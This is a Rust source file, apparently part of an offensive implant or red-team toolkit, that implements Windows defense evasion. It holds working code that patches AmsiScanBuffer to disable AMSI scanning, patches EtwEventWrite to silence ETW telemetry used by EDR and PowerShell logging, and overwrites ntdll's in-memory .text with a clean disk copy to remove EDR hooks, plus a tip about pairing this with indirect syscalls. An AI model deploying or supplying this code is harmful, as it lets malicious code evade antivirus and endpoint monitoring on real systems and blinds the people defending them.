// evasion/patching.rs
//
// In-process userland hook removal and function patching:
//   - AMSI patching  (AmsiScanBuffer → immediate E_INVALIDARG)
//   - ETW patching   (EtwEventWrite  → immediate STATUS_SUCCESS / no-op)
//   - Ntdll unhooking (overwrite hooked .text with clean on-disk copy)

// ── AMSI Patching ──────────────────────────────────────────────────────
// Patches AmsiScanBuffer in amsi.dll to return E_INVALIDARG (0x80070057)
// immediately, preventing the runtime from scanning .NET assemblies,
// PowerShell scripts, and VBA macros loaded into this process.
//
// Patch bytes: B8 57 00 07 80 C3
//   mov eax, 0x80070057 ; E_INVALIDARG
//   ret

#[cfg(target_os = "windows")]
pub fn patch_amsi() -> Result<String, String> {
    unsafe { patch_function("amsi.dll", "AmsiScanBuffer", &[0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]) }
}

#[cfg(not(target_os = "windows"))]
pub fn patch_amsi() -> Result<String, String> { Err("Windows only".into()) }

// ── ETW Patching ───────────────────────────────────────────────────────
// Patches EtwEventWrite in ntdll.dll to return 0 (STATUS_SUCCESS)
// immediately, blinding all ETW consumers in this process — .NET CLR,
// PowerShell scriptblock logging, Windows Defender ATP sensors, and
// any EDR hooking ETW providers.
//
// Patch bytes: 33 C0 C3
//   xor eax, eax   ; STATUS_SUCCESS = 0
//   ret

#[cfg(target_os = "windows")]
pub fn patch_etw() -> Result<String, String> {
    unsafe { patch_function("ntdll.dll", "EtwEventWrite", &[0x33, 0xC0, 0xC3]) }
}

#[cfg(not(target_os = "windows"))]
pub fn patch_etw() -> Result<String, String> { Err("Windows only".into()) }

// ── Generic Function Patcher ───────────────────────────────────────────
// Resolves `func` in `dll`, makes its first `patch.len()` bytes writable
// via VirtualProtect, copies the patch bytes over them, then restores the
// original page protection.

#[cfg(target_os = "windows")]
unsafe fn patch_function(dll: &str, func: &str, patch: &[u8]) -> Result<String, String> {
    use std::ffi::CString;
    use std::ptr;

    extern "system" {
        fn LoadLibraryA(name: *const i8) -> *mut std::ffi::c_void;
        fn GetProcAddress(module: *mut std::ffi::c_void, name: *const i8) -> *mut std::ffi::c_void;
        fn VirtualProtect(addr: *mut std::ffi::c_void, size: usize, new: u32, old: *mut u32) -> i32;
    }
    const PAGE_EXECUTE_READWRITE: u32 = 0x40;

    let dll_c  = CString::new(dll).unwrap();
    let func_c = CString::new(func).unwrap();

    let h = LoadLibraryA(dll_c.as_ptr());
    if h.is_null() { return Err(format!("{} not found", dll)); }

    let p = GetProcAddress(h, func_c.as_ptr());
    if p.is_null() { return Err(format!("{} not found in {}", func, dll)); }

    let mut old = 0u32;
    if VirtualProtect(p, patch.len(), PAGE_EXECUTE_READWRITE, &mut old) == 0 {
        return Err("VirtualProtect failed".into());
    }

    ptr::copy_nonoverlapping(patch.as_ptr(), p as *mut u8, patch.len());

    let mut tmp = 0u32;
    VirtualProtect(p, patch.len(), old, &mut tmp);

    Ok(format!("Patched {}!{}", dll, func))
}

// ── Ntdll Unhooking ────────────────────────────────────────────────────
// Maps a clean copy of ntdll.dll from disk (read-only file mapping, so
// it does not trigger any hooks on the open) and overwrites the .text
// section of the already-loaded (potentially hooked) ntdll.  After this,
// all EDR inline hooks on Nt* functions are removed and direct API calls
// go through the clean code.
//
// Detection note: some EDR products periodically re-check ntdll .text
// integrity via a kernel callback.  Combine with indirect syscalls for
// operations that must survive periodic re-hooking.

#[cfg(target_os = "windows")]
pub fn unhook_ntdll() -> Result<String, String> {
    use std::ffi::{c_void, CString};
    use std::mem;
    use std::ptr;

    extern "system" {
        fn GetModuleHandleA(name: *const i8) -> *mut c_void;
        fn CreateFileA(name: *const i8, access: u32, share: u32, sa: *mut c_void,
                       disp: u32, flags: u32, template: *mut c_void) -> *mut c_void;
        fn CreateFileMappingA(file: *mut c_void, sa: *mut c_void, protect: u32,
                              hi: u32, lo: u32, name: *const i8) -> *mut c_void;
        fn MapViewOfFile(mapping: *mut c_void, access: u32, hi: u32, lo: u32, bytes: usize) -> *mut c_void;
        fn UnmapViewOfFile(addr: *const c_void) -> i32;
        fn VirtualProtect(addr: *mut c_void, size: usize, new: u32, old: *mut u32) -> i32;
        fn CloseHandle(h: *mut c_void) -> i32;
    }

    const GENERIC_READ:          u32 = 0x80000000;
    const FILE_SHARE_READ:       u32 = 1;
    const OPEN_EXISTING:         u32 = 3;
    const PAGE_READONLY:         u32 = 2;
    const PAGE_EXECUTE_READWRITE:u32 = 0x40;
    const FILE_MAP_READ:         u32 = 4;
    const INVALID_HANDLE: *mut c_void = -1isize as *mut c_void;

    #[repr(C)]
    struct ImageDosHeader { e_magic: u16, _pad: [u8; 58], e_lfanew: i32 }

    #[repr(C)]
    struct ImageSectionHeader {
        name: [u8; 8], virtual_size: u32, virtual_address: u32,
        size_of_raw_data: u32, pointer_to_raw_data: u32, _pad: [u8; 12],
        characteristics: u32,
    }

    unsafe {
        let ntdll_name  = CString::new("ntdll.dll").unwrap();
        let loaded_base = GetModuleHandleA(ntdll_name.as_ptr());
        if loaded_base.is_null() { return Err("ntdll not loaded".into()); }

        let path    = CString::new("C:\\Windows\\System32\\ntdll.dll").unwrap();
        let h_file  = CreateFileA(path.as_ptr(), GENERIC_READ, FILE_SHARE_READ,
                                  ptr::null_mut(), OPEN_EXISTING, 0, ptr::null_mut());
        if h_file == INVALID_HANDLE { return Err("CreateFileA failed".into()); }

        let h_mapping = CreateFileMappingA(h_file, ptr::null_mut(), PAGE_READONLY, 0, 0, ptr::null());
        if h_mapping.is_null() {
            CloseHandle(h_file);
            return Err("CreateFileMapping failed".into());
        }

        let clean_base = MapViewOfFile(h_mapping, FILE_MAP_READ, 0, 0, 0);
        if clean_base.is_null() {
            CloseHandle(h_mapping); CloseHandle(h_file);
            return Err("MapViewOfFile failed".into());
        }

        let dos = &*(loaded_base as *const ImageDosHeader);
        if dos.e_magic != 0x5A4D {
            UnmapViewOfFile(clean_base); CloseHandle(h_mapping); CloseHandle(h_file);
            return Err("Invalid DOS header".into());
        }

        let nt_off          = dos.e_lfanew as usize;
        let file_header_ptr = (loaded_base as *const u8).add(nt_off + 4);
        let num_sections    = *(file_header_ptr.add(2)  as *const u16);
        let opt_header_size = *(file_header_ptr.add(16) as *const u16) as usize;
        let sections_start  = nt_off + 4 + 20 + opt_header_size;

        let mut text_rva        = 0u32;
        let mut text_size       = 0u32;
        let mut text_raw_offset = 0u32;
        let mut found = false;

        for i in 0..num_sections as usize {
            let sec = &*((loaded_base as *const u8).add(sections_start + i * 40)
                         as *const ImageSectionHeader);
            if &sec.name[..5] == b".text" {
                text_rva        = sec.virtual_address;
                text_size       = sec.virtual_size;
                text_raw_offset = sec.pointer_to_raw_data;
                found = true;
                break;
            }
        }

        if !found {
            UnmapViewOfFile(clean_base); CloseHandle(h_mapping); CloseHandle(h_file);
            return Err(".text section not found".into());
        }

        let loaded_text = (loaded_base as *mut u8).add(text_rva as usize);
        let clean_text  = (clean_base  as *const u8).add(text_raw_offset as usize);

        let mut old_protect = 0u32;
        if VirtualProtect(loaded_text as *mut c_void, text_size as usize,
                          PAGE_EXECUTE_READWRITE, &mut old_protect) == 0
        {
            UnmapViewOfFile(clean_base); CloseHandle(h_mapping); CloseHandle(h_file);
            return Err("VirtualProtect failed on .text".into());
        }

        ptr::copy_nonoverlapping(clean_text, loaded_text, text_size as usize);

        let mut tmp = 0u32;
        VirtualProtect(loaded_text as *mut c_void, text_size as usize, old_protect, &mut tmp);

        UnmapViewOfFile(clean_base);
        CloseHandle(h_mapping);
        CloseHandle(h_file);

        Ok(format!("Ntdll unhooked: restored {} bytes in .text", text_size))
    }
}

#[cfg(not(target_os = "windows"))]
pub fn unhook_ntdll() -> Result<String, String> { Err("Windows only".into()) }

#[cfg(test)]
mod tests {
    use super::*;

    // ── Non-Windows stubs ─────────────────────────────────────────────────

    #[cfg(not(target_os = "windows"))]
    #[test]
    fn patch_amsi_is_err_on_non_windows() {
        let e = patch_amsi().unwrap_err();
        assert!(e.contains("Windows only"), "got: {e}");
    }

    #[cfg(not(target_os = "windows"))]
    #[test]
    fn patch_etw_is_err_on_non_windows() {
        let e = patch_etw().unwrap_err();
        assert!(e.contains("Windows only"), "got: {e}");
    }

    #[cfg(not(target_os = "windows"))]
    #[test]
    fn unhook_ntdll_is_err_on_non_windows() {
        let e = unhook_ntdll().unwrap_err();
        assert!(e.contains("Windows only"), "got: {e}");
    }

    // ── Result contract — no panics on any platform ───────────────────────
    // These run on every OS: they verify each function returns a Result
    // rather than panicking, without asserting which variant it is.

    #[test]
    fn patch_amsi_returns_result_not_panic() { let _ = patch_amsi(); }

    #[test]
    fn patch_etw_returns_result_not_panic() { let _ = patch_etw(); }

    #[test]
    fn unhook_ntdll_returns_result_not_panic() { let _ = unhook_ntdll(); }

    // ── Success message format (Windows) ──────────────────────────────────
    // When the patching succeeds the returned string must contain both the
    // DLL name and the function name so operator logs are parseable.

    #[cfg(target_os = "windows")]
    #[test]
    fn patch_amsi_ok_message_contains_dll_and_func() {
        if let Ok(msg) = patch_amsi() {
            assert!(msg.contains("amsi.dll"), "message: {msg}");
            assert!(msg.contains("AmsiScanBuffer"), "message: {msg}");
        }
        // Err is also acceptable (e.g. amsi.dll not loaded in test process).
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn patch_etw_ok_message_contains_dll_and_func() {
        if let Ok(msg) = patch_etw() {
            assert!(msg.contains("ntdll.dll"), "message: {msg}");
            assert!(msg.contains("EtwEventWrite"), "message: {msg}");
        }
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn unhook_ntdll_ok_message_contains_byte_count() {
        if let Ok(msg) = unhook_ntdll() {
            // "Ntdll unhooked: restored N bytes in .text"
            assert!(msg.contains("bytes"), "message: {msg}");
        }
    }
}
